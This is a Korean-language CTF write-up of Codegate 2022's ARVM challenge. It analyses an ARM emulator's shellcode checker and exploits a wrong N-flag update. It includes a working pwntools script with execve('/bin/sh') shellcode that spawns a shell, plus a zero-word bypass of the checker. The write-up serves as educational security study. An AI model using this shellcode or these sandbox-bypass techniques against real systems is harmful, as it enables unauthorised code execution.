---
title: "[Codegate CTF 2022] ARVM"
date: 2022-07-03 11:26:07
tags:
categories: [Security, CTF]
---

## 개요

> Welcome! Here is my Emulator. It can use only human.
> Always SMiLEY :)

[chall.zip](/uploads/codegate22-arvm/chall.zip)


## 문제 분석

32비트 ARM 바이너리 `app` 과 `Dockerfile` , `run.sh` 등이 주어집니다. `run.sh` 파일에서 바이너리는 `qemu-arm-static` 으로 에뮬레이션하여 실행됨을 확인할 수 있습니다. 바이너리는 심볼이 strip되어 있고, NX, canary 보호 기법이 적용되어 있습니다.

```bash
$ checksec app
[*] '/home/user/study/ctf/codegate22/arvm/app'
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000)
```

바이너리를 실행하면 코드를 입력받고, 3가지의 메뉴가 주어집니다. 코드를 입력하고 '1. Run Code'를 선택하면 바이너리가 출력하는 Secret code를 똑같이 입력해야 하는데, 앞서 코드로 "111" 을 입력했더니 "Instruction 0xa31313131 is invalid" 메시지와 함께 종료됩니다.

```bash
$ qemu-arm-static -L /usr/arm-linux-gnueabi ./app
Running Emulator...
Welcome Emulator
Insert Your Code :> 111
1. Run Code
2. View Code
3. Edit Code
:> 1
Before run, it has some captcha
Secret code : 0x52bae0cd
Code? :> 0x52bae0cd
Instruction 0xa313131 is invalid
```

`main` 함수를 살펴보면 다음과 같습니다. 13행에서 `setup` 함수를 호출하여 필요한 구조체와 메모리를 할당하고, 17행에서 `edit_code` 함수를 호출하여 코드를 입력받습니다. 53행에서 호출하는 `check_code` 함수의 리턴값이 -1이 아니면 56~61행에서 입력한 코드를 실행하는데, `R0` 부터 `R12` 까지 모두 0으로 초기화하는 코드를 앞에 덧붙인 후 실행합니다.

```c
int __fastcall main()
{
  void *v0; // r0
  int captcha; // [sp+4h] [bp-30h] BYREF
  int input; // [sp+8h] [bp-2Ch] BYREF
  int choice; // [sp+Ch] [bp-28h]
  int fd; // [sp+10h] [bp-24h]
  void *dest; // [sp+14h] [bp-20h]
  char s[16]; // [sp+1Ch] [bp-18h] BYREF
  void *v8; // [sp+2Ch] [bp-8h]

  v8 = &_stack_chk_guard;
  if ( setup() == -1 )
    exit(-1);
  if ( loading() == -1 )
    exit(-1);
  if ( edit_code() == -1 )
    exit(-1);
  while ( 1 )
  {
    print_menu();
    memset(s, 0, sizeof(s));
    read(0, s, 16u);
    choice = atoi(s);
    if ( choice == 1 )                          // 1. Run Code
      break;
    if ( choice == 2 )                          // 2. View Code
    {
      write(1, em->code, 4096u);
    }
    else if ( choice == 3 )                     // 3. Edit Code
    {
      if ( loading() == -1 )
        exit(-1);
      if ( edit_code() == -1 )
        exit(-1);
    }
  }
  captcha = 0;
  fd = open("/dev/urandom", 2);
  read(fd, &captcha, 4u);
  close(fd);
  puts("Before run, it has some captcha");
  printf("Secret code : 0x%x\n", captcha);
  input = 0;
  printf("Code? :> ");
  _isoc99_scanf("0x%x", &input);
  if ( captcha != input )
  {
    puts("You are Robot!");
    exit(-1);
  }
  if ( check_code() == -1 )
    exit(-1);
  puts("Good! Now Execute Real Machine");
  dest = calloc(1u, 0x1000u);
  memcpy(dest, em->code, 4096u);
  memset(em->code, 0, 4096u);
  memcpy(em->code, &clear_regs_code, 52u);      // mov {r0-r12}, 0
  v0 = memcpy(em->code + 52, dest, 4044u);
  ((void (__fastcall *)(void *))em->code)(v0);
  return 0;
}
```

`setup` 함수는 `emulator` 구조체 변수 `em` 과 `reg` 구조체, 각종 메모리를 할당합니다. `emulator` 구조체는 `mmap` 시스템 콜로 할당한 코드, 힙, 스택 역할을 하는 메모리의 주소와 `reg` 구조체 포인터를 멤버로 가집니다. `reg` 구조체는 범용 레지스터들과 `CPSR` 레지스터 역할을 하는 정수형 변수 17개를 멤버로 가집니다. 할당 이후 `em->reg->pc` , `em->reg->sp` 를 각각 `em->code` , `em->stack` 으로 초기화합니다.

```c
int setup() // 0x1088c
{
  emulator *v1; // r4
  emulator *v2; // r4
  emulator *v3; // r4
  emulator *v4; // r4

  setvbuf((FILE *)stdin, 0, 2, 0);
  setvbuf((FILE *)stdout, 0, 2, 0);
  em = (emulator *)calloc(1u, 16u);
  if ( !em )
    return -1;
  v1 = em;
  v1->code = (char *)mmap((void *)0x1000, 4096u, 7, 0x4022, -1, 0);
  if ( !em->code )
    return -1;
  v2 = em;
  v2->heap = (char *)mmap((void *)0x2000, 4096u, 3, 0x4022, -1, 0);
  if ( !em->heap )
    return -1;
  v3 = em;
  v3->stack = (char *)mmap((void *)0x3000, 4096u, 3, 0x4022, -1, 0);
  if ( !em->stack )
    return -1;
  v4 = em;
  v4->reg = (struct reg *)calloc(1u, 68u);
  if ( !em->reg )
    return -1;
  em->reg->pc = (unsigned int)em->code;
  em->reg->sp = (unsigned int)em->stack;
  return 0;
}
```

```c
struct emulator
{
  struct reg *reg;
  char *stack;
  char *code;
  char *heap;
};

struct reg
{
  unsigned int r0, r1, r2, r3, r4, r5, r6, r7, r8, r9, r10, r11, r12;
  unsigned int sp, lr, pc, cpsr;
};
```

`edit_code` 함수는 `em->code` 주소에 실행할 코드를 입력받는데, 길이가 4의 배수가 아니면 -1을 반환합니다. 이 경우 `main` 함수에서 `exit(-1)` 을 호출하여 종료합니다. 입력받은 후 `exit` 시스템 콜을 호출하는 코드를 뒤에 덧붙입니다.

```c
int edit_code() // 0x10af0
{
  ssize_t len; // [sp+4h] [bp-8h]

  len = read(0, em->code, 4031u);
  if ( len < 0 )
    return -1;
  if ( (len & 3) != 0 )
    return -1;
  memcpy(&em->code[len], &exit_code, 12u);
  return 0;
}
```

`check_code` 함수는 반복문을 돌면서 `em->reg->pc` 로부터 4바이트씩 인스트럭션 `inst` 를 읽습니다. `check_cpsr` 함수를 `inst` 를 인자로 호출하여 리턴값이 0이 아니면, switch-case 구문으로 인스트럭션의 클래스에 해당하는 `check_*` 함수를 호출합니다. `check_cpsr` 함수가 0을 리턴하거나 `check_*` 함수가 -1을 리턴하는 경우 `sigill` 함수를 호출하는데, 이 함수는 오류 메시지를 출력하고 `exit(-1)` 로 프로그램을 종료합니다.

```c
int __fastcall check_code() // 0x10bb0
{
  unsigned int op1; // r0
  int inst; // [sp+0h] [bp-Ch]
  int fetched; // [sp+4h] [bp-8h]

  for ( inst = -1; em->reg->pc < (unsigned int)(em->code + 4096); inst = fetched )
  {
    if ( (char *)em->reg->pc < em->code )
      break;
    fetched = *(_DWORD *)em->reg->pc;
    em->reg->pc += 4;
    if ( !inst )
      break;
    if ( inst != -1 && !check_cpsr(inst) )
      sigill(inst);
    op1 = get_class(inst);
    if ( op1 <= 4 )
    {
      switch ( op1 )
      {
        case 0u:                                // data processing and miscellaneous instructions
          if ( check_data_processing(inst) == -1 )
            sigill(inst);
          continue;
        case 1u:
          if ( check_multiply(inst) == -1 )
            sigill(inst);
          continue;
        case 2u:                                // branch, branch with link, block data transfer
          if ( check_branch(inst) == -1 )
            sigill(inst);
          fetched = -1;
          continue;
        case 3u:                                // supervisor call
          if ( check_syscall() == -1 )
            sigill(inst);
          continue;
        case 4u:                                // load/store word and unsigned byte
          if ( check_load_store(inst) == -1 )
            sigill(inst);
          continue;
        default:
          goto LABEL_23;
      }
    }
    if ( op1 != -1 )
LABEL_23:
      sigill(inst);
  }
  return 0;
}
```

각각의 `check_*` 함수는 인스트럭션의 형식이나 인자를 검사한 후, 통과하면 인스트럭션의 실행 결과를 `emulator` 구조체 변수 `em` 에 반영하고 통과하지 못한 경우 -1을 리턴하여 종료하도록 합니다. 예를 들어 `check_branch` 함수는 인자가 상수(immediate) 값인 분기 인스트럭션을 검사하고 `em->reg->pc` 를 갱신하는데, 조건문을 통해 목적지 주소가 `em->code` 로 할당된 메모리를 벗어나는 경우 -1을 반환합니다.

```c
int __fastcall check_branch(int inst)   // 0x11f28
{
  int v1; // r0
  int v2; // r3

  v1 = shl8(inst);
  v2 = 4 * (v1 >> 8);
  if ( ((v1 >> 8) & 0x20000000) != 0 )
    v2 += 3;
  if ( em->reg->pc + 4 * (v2 >> 2) >= (unsigned int)(em->code + 0x4000) )
    return -1;
  em->reg->pc += 4 * (4 * (v1 >> 8) / 4);
  return 0;
}
```


## 문제 풀이

분석한 결과를 바탕으로 생각할 수 있는 익스플로잇 시나리오가 두 가지 정도 있습니다.

1. `check_code` 함수의 `check_*` 루틴에서 익스플로잇 프리미티브(e.g. 임의 쓰기)를 찾아 익스플로잇한다.
2. `check_code` 의 검사를 통과하면서, `main` 에서 입력한 코드를 호출했을 때 익스플로잇이 수행되는 셸코드를 입력한다.

그런데 `check_*` 함수들은 대부분 목적지 레지스터나 주소의 범위에 제한을 두고 있어 익스플로잇 프리미티브 구성에 도움이 되지 않습니다. 예를 들어 다음은 `check_load_store` 함수의 일부입니다. 23행, 26행, 32행 등을 보면 목적지 레지스터는 `R0` , ... , `R12` 까지만 가능하도록, 읽고 쓰는 주소는 `em->heap` , `em->stack` 으로 할당된 메모리만 가능하도록 제한을 두고 있습니다.

```c
int __fastcall check_load_store(int inst)	// 0x12000
{
  // ...
  bit11_0 = get_bit11_0(inst);
  rn = get_bit16_19(inst);
  if ( rn <= 12 )
  {
    rn_val = (char *)*(&em->reg->r0 + rn);
    if ( get_bit25(inst) )                      // bit25 is 1 (A bit)
    {
      rm = bit11_0 & 0xF;
      if ( rm > 12 )
        return -1;
    // ...
    if ( get_bit24(inst) )                      // bit24 is 1 (P bit)
    {
      if ( get_bit23(inst) )                    // bit23 is 1 (U bit)
        v6 = &rn_val[bit11_0];
      else
        v6 = &rn_val[-bit11_0];
      if ( get_bit20(inst) )                    // bit20 is 1
      {
        if ( (v6 < em->heap || v6 > em->heap + 4096) && (v6 < em->stack || v6 > em->stack + 4096) )
          return -1;
        rt = shr12(inst);
        if ( rt > 0xC )
          return -1;
        *(&em->reg->r0 + rt) = *(_DWORD *)v6;   // load
      }
      else
      {
        if ( (v6 < em->heap || v6 > em->heap + 4096) && (v6 < em->stack || v6 > em->stack + 4096) )
          return -1;
        v13 = shr12(inst);
        if ( v13 > 0xC )
          return -1;
        *(_DWORD *)v6 = *(&em->reg->r0 + v13);  // store
      }
    }
    // ...
```

산술 연산과 관련된 인스트럭션을 검사하는 `check_data_processing` 함수에서도 9행, 11행 등에서 산술 연산의 목적지와 인자 레지스터에 제한을 두고 있습니다. 그런데 실제 연산의 결과를 반영하는 서브루틴에서 흥미로운 코드를 찾을 수 있습니다.

```c
int __fastcall check_data_processing(int inst)	// 0x117b8
{
  // ...
  v7 = sub_114E0(inst);
  bit11_0 = get_bit11_0(inst);
  bit16_19 = get_bit16_19(inst);
  v10 = shr12(inst);
  bit20 = get_bit20(inst);
  if ( bit16_19 < 0 || bit16_19 > 12 )
    return -1;
  if ( v10 < 0 || v10 > 12 )
    return -1;
  // ...
  switch ( v7 )
  {
    // ...
    case 4u:
      if ( check_add(bit16_19, v4, v10, bit20) == -1 )
        sigill(inst);
      return result;
    // ...
```

`check_add` 함수는 `check_data_processing` 함수에서 `ADD` 인스트럭션의 결과를 반영하기 위해 호출하는 서브루틴입니다. 이 함수는 연산 결과를 목적지 레지스터에 대입하고, `update_zf_nf` 함수를 호출하여 `CPSR` 레지스터의 플래그를 갱신하고 있습니다. (`update_zf_nf` 함수를 호출하는 조건 `a4` 는 인스트럭션의 bit 20이 전달된 값으로, `S` 비트에 해당합니다)

```c
int __fastcall check_add(int a1, int a2, int a3, int a4)	// 0x12fb8
{
  int result; // [sp+14h] [bp-8h]

  update_cf(*(&em->reg->r0 + a1) + a2 < *(&em->reg->r0 + a1));
  result = a2 + *(&em->reg->r0 + a1);
  if ( a4 )
    update_zf_nf(result);
  *(&em->reg->r0 + a3) = result;
  return 0;
}
```

`update_zf_nf` 함수는 인자로 받은 연산 결과를 `update_zf` , `update_nf` 함수에 전달합니다.

```c
int __fastcall update_zf_nf(int a1)	// 0x12d4c
{
  update_zf(a1);
  update_nf(a1);
  return 0;
}
```

`update_nf` 함수는 연산의 결과가 0이 아닐 경우 비트 연산을 통해 `em->reg->cpsr` 값의 bit 31에 1을 대입합니다. 이는 `CPSR` 레지스터의 `N` 비트에 해당하는데, 정의 상 `N` 비트는 결과가 음수인 경우(최상위 비트가 1인 경우) 1이어야 합니다. 따라서 `update_nf` 함수는 `em->reg->cpsr` 값을 실제 인스트럭션의 결과와 다르게 반영하고 있습니다.

```c
int __fastcall update_nf(int a1)    // 0x12ccc
{
  if ( a1 )
    em->reg->cpsr |= 0x80000000;
  else
    em->reg->cpsr &= 0x70000000u;
  return 0;
}
```

이를 이용해 다음과 같이 셀코드를 입력하고도 `check_code` 함수를 통과하여 실행하는 익스플로잇 시나리오를 구성할 수 있습니다. (단순 셸코드를 입력하면 `check_syscall` 함수에서 시스템 콜 번호를 필터링하여 종료합니다)

1. 산술 연산을 통해 `em->reg->cpsr` 의 `N` 비트가 1이 되도록 합니다. (잘못 반영된 결과입니다)
2. `N` 비트와 관련된 조건 분기를 통해 셸코드 부분을 실행하지 않고 점프하도록 합니다.
3. 실제 실행 시에는 `N` 비트가 0으로 조건 분기를 수행하지 않아, 셸코드를 실행하게 됩니다.

`check_cpsr` 함수를 보면 모든 조건이 구현되어 있지는 않지만, `LT` (signed less than) 조건은 구현되어 있습니다. 따라서 셸코드 이전에 결과가 0이 아닌 산술 연산을 수행하고 `BLT` 인스트럭션으로 조건 분기하도록 하겠습니다. `check_code` 함수 상에서는 `update_nf` 함수에서 잘못 반영한 결과로 인해 `N` 비트가 1이 되어, `V` 비트와 같지 않게 되므로 조건 분기를 수행합니다. 그러나 실제 실행 시에는 `N` 비트가 0으로 조건 분기를 수행하지 않을 것입니다.

```c
int __fastcall check_cpsr(int inst) // 0x11314
{
  _BOOL4 v1; // r3
  _BOOL4 v2; // r3
  int valid; // [sp+8h] [bp-24h]
  unsigned int cpsr; // [sp+10h] [bp-1Ch]

  cpsr = em->reg->cpsr;
  switch ( shr28(inst) )
  {
    case 0u:                                    // equal (z == 1)
      valid = cpsr & 0x40000000;
      break;
    case 1u:                                    // not equal (z == 0)
      valid = (cpsr & 0x40000000) == 0;
      break;
    case 10u:                                   // signed greater than or equal (n == v)
      valid = cpsr >> 31 == (8 * cpsr) >> 31;
      break;
    case 11u:                                   // signed less than (n != v)
      valid = cpsr >> 31 != (8 * cpsr) >> 31;
      break;
    case 12u:                                   // signed greater than (z == 0 and n == v)
      v1 = (cpsr & 0x40000000) == 0 && cpsr >> 31 == (8 * cpsr) >> 31;
      valid = v1;
      break;
    case 13u:                                   // signed less than or equal (z == 1 or n == v)
      v2 = (cpsr & 0x40000000) != 0 || cpsr >> 31 != (8 * cpsr) >> 31;
      valid = v2;
      break;
    case 14u:                                   // always
      valid = 1;
      break;
    default:                                    // can only be executed unconditionally
      valid = 0;
      break;
  }
  return valid;
}
```

다음과 같이 `ADDS` 인스트럭션의 결과가 1이 되도록 하고, `BLT` 의 분기 주소를 셸코드 이후가 되도록 익스플로잇 코드를 작성하였습니다. 익스플로잇 코드를 실행하면 셸을 획득할 수 있습니다.

```python
#!/usr/bin/python3
from pwn import *

# r = process(["qemu-arm-static", "-L", "/usr/arm-linux-gnueabi", "./app"])
r = remote("localhost", 1234)
# context.log_level = "debug"

def main():
    payload = asm("""
    adds r0, r0, 1
    blt exit

shellcode:
    add r0, pc, 12
    mov r1, 0
    mov r2, 0
    mov r7, 11
    svc 0
    .word 0x6e69622f
    .word 0x0068732f

exit:
    """, arch="arm")

    r.sendafter(b"Insert Your Code :>", payload)
    r.sendlineafter(b":>", b"1")
    r.recvuntil(b"Secret code :")
    r.sendlineafter(b"Code? :>", r.recvline().strip())

    r.interactive()

if __name__ == "__main__":
    main()
```

```bash
$ ./ex.py
[+] Opening connection to localhost on port 1234: Done
[*] Switching to interactive mode
 Good! Now Execute Real Machine
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

### 다른 풀이

`check_code` 함수를 보면 다음의 10행에서 `inst` 가 0인 경우 반복문을 탈출합니다. 이 경우 0을 리턴하여 `main` 함수의 검사를 통과하기 때문에 곧바로 입력한 코드를 실행할 수 있습니다. ARM에서 기계어 `\x00\x00\x00\x00` 은 `ANDEQ R0, R0, R0` 인스트럭션에 해당하는데, 실제로는 아무 영향이 없는 `NOP` 와 같습니다.

```c
int __fastcall check_code()
{
  // ...
  for ( inst = -1; em->reg->pc < (unsigned int)(em->code + 4096); inst = fetched )
  {
    if ( (char *)em->reg->pc < em->code )
      break;
    fetched = *(_DWORD *)em->reg->pc;
    em->reg->pc += 4;
    if ( !inst )
      break;
    if ( inst != -1 && !check_cpsr(inst) )
      sigill(inst);
    op1 = get_class(inst);
    // ...
    if ( op1 != -1 )
LABEL_23:
      sigill(inst);
  }
  return 0;
}
```

따라서 코드를 입력할 때 `\x00\x00\x00\x00` 이후 셸코드를 입력하면 `check_code` 함수를 통과하여 셸코드를 실행할 수 있습니다. 이 풀이는 출제자가 디스코드에서 의도하지 않은 풀이라고 밝혔습니다.


## 참고자료

[1] ARM, “A5: ARM Instruction Set Encoding,” in *ARM® Architecture Reference Manual ARMv7-A and ARMv7-R edition*. ARM Limited, 2018, pp. 191-216.
